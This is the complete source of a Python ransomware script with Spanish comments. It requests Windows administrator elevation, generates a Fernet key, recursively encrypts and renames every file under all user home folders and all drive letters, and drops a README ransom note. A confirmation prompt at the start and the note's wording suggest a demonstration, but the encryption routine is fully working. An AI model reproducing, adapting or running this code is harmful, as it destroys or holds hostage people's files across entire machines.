from cryptography.fernet import Fernet
import os
import psutil
import sys
import ctypes




if input("Do you want to do this? (y/n)")!="y":
    print(2/0)

def run_as_admin():
    try:
        # Solicita permisos de administrador
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    except Exception as e:
        print(f"Error al solicitar permisos de administrador: {e}")
        sys.exit(1)

if ctypes.windll.shell32.IsUserAnAdmin():
    pass
else:
    print("Este programa requiere permisos de administrador. Solicitando elevación...")
    run_as_admin()


extension = 'encripted'


# Función para generar la clave de cifrado y almacenada en un archivo en el directorio local.
def generar_key():
    key = Fernet.generate_key()
    print(key)
    with open('key.key', 'wb') as key_file:
        print("")
        key_file.write(key)


# Función para obtener la clave de cifrado del archivo local.
def cargar_key():
    return open('key.key', 'rb').read()


# Función para encriptar los archivos y su renombramiento con la extensión personalizada.
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(encrypted_data)

        os.rename(item, item + '.' + extension)



def find_drives():
    L = set()
    for i in range(ord('a'), ord('z')+1):
        drive = chr(i)
        if(os.path.exists(drive +":\\")):
            L.add(drive.upper()+":\\")
    return L



def get_users():
    return {psutil.users()[i][0] for i in range(len(psutil.users()))}
users = get_users()

if __name__ == '__main__':

    try:
        # Directorio que vamos a cifrar.
        for user in users:
            directories = {'C:\\Users\\'+user+"\\" for user in users}
        
        directories.update(find_drives())

        # Generación la clave de cifrado y se almacena en una variable.
        generar_key()
        key = cargar_key()

        while directories:
            path = directories.pop()
            try:
                print(f'Intentando acceder a {path}')
                os.chdir(path)
                itemsInPath = os.listdir(path)
                print(itemsInPath)
                files = set()
                for item in itemsInPath:
                    if os.path.isdir(path+item):
                        directories.add(path+item+"\\")
                    else:
                        files.add(path+item)
                encrypt(files, key)

            except Exception as e:
                print('Error:', e)
            # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
        with open( path + '\\README.txt', 'w') as file:
            file.write('Ficheros encriptados.\nSe suele pedir un rescate para el desencriptado.')

    except Exception as e:
        print(e)